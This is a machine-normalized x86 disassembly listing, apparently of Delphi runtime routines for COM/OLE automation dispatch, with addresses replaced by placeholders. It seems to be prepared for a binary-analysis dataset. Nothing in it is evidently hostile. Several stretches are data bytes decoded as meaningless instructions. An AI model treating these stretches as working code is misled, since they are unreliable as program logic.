mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_463ab8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404dc4
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404dc4
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4637ef
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404da0
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404dc4
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40fa54
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_46381c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
pop ecx
pop ecx
pop ebp
retn
sub_463850
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_408904
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_462f6c
push ebp
call sub_46381c
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463948
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_463930
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_463850
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4634d8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40f1e8
sub_4639e4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_463aa9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462de8
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_404224
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_404224
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_404224
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_462eb8
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463ab0
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc0
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_4039d8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404b3c
jmp r-xdata
sub_463ad4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_463ac4
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_4639e4
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_463bb8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_463ad4
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_463be9 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40f1e8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_463c94
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_41774c
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_41774c
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_463d0a
mov eax eax
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463d82
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d89
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404a50
call CoUninitialize
sub_463d8c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4632d4
mov eax sub_463948
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_463bb8
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_463c94
sub_463de4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463e09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463e10
retn
sub_463e1c
push 0x463e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3e ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c00463e ] cl
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
enter 0x4644 0x0
hlt
sub_463e69
inc esp
inc esi
add [ edx + ebp + 0x40 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + edx + 0xc0040 ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
adc al 0x0
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
mov eax eax
push esp
aas
inc esi
je r-xdata
imul edi [ edi ] 0x3f710046
jb r-xdata
add [ eax ] al
insd
inc ecx
popad
jo r-xdata
inc eax
add [ eax ] al
xor al [ eax ]
enter 0x4644 0x0
dec eax
dec eax
inc esi
add [ eax + 0xc004646 ] al
push esp
inc esi
outsd
outsb
je r-xdata
inc esi
add bh ah
aas
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40 ] bh
inc esi
add [ eax ] ch
add [ eax ] al
add [ esi + edi ] bl
inc esi
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc [ ebx - 0x23fbdbbc ]
jmp sub_405aa0
outsd
je r-xdata
add dh ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi + 0x46 ] dl
add [ eax + eax ] dl
add [ eax ] al
push esp
adc al [ eax ]
xchg esp eax
xor al 0x40
add [ edx + ebx * 2 + 0x40 ] cl
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ eax ] dl
push esp
inc ecx
popad
jo r-xdata
jb r-xdata
add al 0x24
retn
popad
jo r-xdata
inc esi
add [ ebx - 0x52ffb9c1 ] ah
aas
inc esi
add [ edi - 0x68ffb9c1 ] dh
aas
inc esi
add [ edx ] al
add [ eax ] al
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
add ebx 0x2000463f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
add [ ebp + 0x6900463f ] cl
aas
inc esi
add [ ecx + 0x3f ] dh
imul sp [ ebp + 0x72 ] 0x408d
add ah cl
add eax 0xffffffe0
jmp r-xdata
add [ eax + 0x3e ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1c00463e ] cl
add [ eax ] al
add [ edx + edx + 0x40 ] dl
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
enter 0x4644 0x0
hlt
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff0
jmp r-xdata
add bl al
inc eax
inc esi
add ch cl
inc eax
inc esi
add bh dl
inc eax
inc esi
add [ edi + 0x2004640 ] dh
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464b19
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_46461b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ 0xffffffffad004640 ] eax
inc eax
inc esi
add [ ecx - 0x6effb9c0 ] cl
inc eax
inc esi
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x40e4da82
inc esi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x40f8da82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
inc ecx
inc esi
add [ eax ] cl
inc ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x28004641 ] bl
add [ eax ] al
add [ esi + edi ] bl
inc esi
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
enter 0x4644 0x0
hlt
cmp eax 0x3fd7da82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jo r-xdata
scasd [ edi ]
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405a10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b20
lea eax [ ebp - 0x2c ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
call sub_4059cc
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_423164
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_4047f4
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_404804
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_4231d8
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_423214
test al 0x1
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405a10
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebx + 0x1c ]
call sub_42327c
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_423214
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_423214
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_423214
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_4059cc
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_465478
call sub_462f6c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_464500
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_464d25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42992c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_429960
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40324c
retn
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_425d38
call sub_429bb0
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_425d50
call sub_426780
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4264f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_464e35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426150
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_426168
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4261c0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_464e09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_423a18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e10
mov eax [ ebp - 0x18 ]
call sub_40324c
retn
mov eax [ ebp - 0x8 ]
call sub_4059cc
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_465494
call sub_462f6c
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_464500
sub_4640e4
cdq
inc eax
inc esi
add [ ebx - 0x52ffb9c0 ] ah
inc eax
inc esi
add [ ecx - 0x6effb9c0 ] cl
inc eax
inc esi
add bl al
inc eax
inc esi
add ch cl
inc eax
inc esi
add bh dl
inc eax
inc esi
add [ edi + 0x2004640 ] dh
add [ eax ] al
add [ ecx ] dh
dec ebp
pop ebp
jns r-xdata
mov [ 0xffffffffad004640 ] eax
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x40e4da82
inc esi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x40f8da82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
inc ecx
inc esi
add [ eax ] cl
inc ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x28004641 ] bl
add [ eax ] al
add [ esi + edi ] bl
inc esi
add [ esp + esi + 0x5a4c0040 ] dl
inc eax
add [ eax + 0x5a ] bl
inc eax
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add [ eax + 0x5a ] ch
inc eax
add [ eax ] al
xor al [ eax ]
enter 0x4644 0x0
hlt
sub_464191
inc esp
inc esi
add ah dh
dec ebx
inc esi
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
inc esi
add [ ecx + edx * 2 ] al
jb r-xdata
jpo r-xdata
jo r-xdata
je r-xdata
inc ecx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x42 ] bl
inc esi
add [ edx + eax * 2 + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x42 ] ch
inc esi
add [ eax + eax ] ch
add [ eax ] al
or [ ebx ] bl
inc edx
add [ esp + esi - 0x567fffc0 ] dl
inc ecx
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al 0xa7
inc ecx
add al al
test al 0x41
add [ eax - 0x37ffbdac ] cl
dec esi
inc esi
add [ eax ] dl
stosb [ edi ]
inc ecx
add ah bh
dec esi
cli
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
